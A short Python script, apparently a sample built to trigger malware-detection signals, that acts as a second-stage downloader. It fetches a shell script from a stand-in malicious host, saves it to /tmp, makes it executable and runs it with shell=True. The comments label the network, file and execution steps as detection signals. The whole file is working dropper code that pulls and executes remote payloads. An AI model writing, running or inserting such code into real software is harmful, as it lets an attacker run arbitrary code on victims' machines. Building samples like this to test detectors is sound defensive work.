import urllib.request
import os
import subprocess

def download_and_execute():
    """Downloads a second-stage payload and executes it immediately."""
    payload_url = "http://malicious-update-server.com/bin/update.sh"
    save_path = "/tmp/update_patch.sh"
    
    try:
        print(f"Downloading update from {payload_url}...")
        # Network signal: Web request to an external domain
        with urllib.request.urlopen(payload_url, timeout=10) as response:
            with open(save_path, 'wb') as out_file:
                out_file.write(response.read())
        
        # File signal: Changing permissions
        os.chmod(save_path, 0o755)
        
        # Execution signal: Running a newly downloaded script
        print("Executing update...")
        subprocess.Popen([save_path], shell=True)
        
    except Exception as e:
        print(f"Downloader failed: {e}")

if __name__ == "__main__":
    download_and_execute()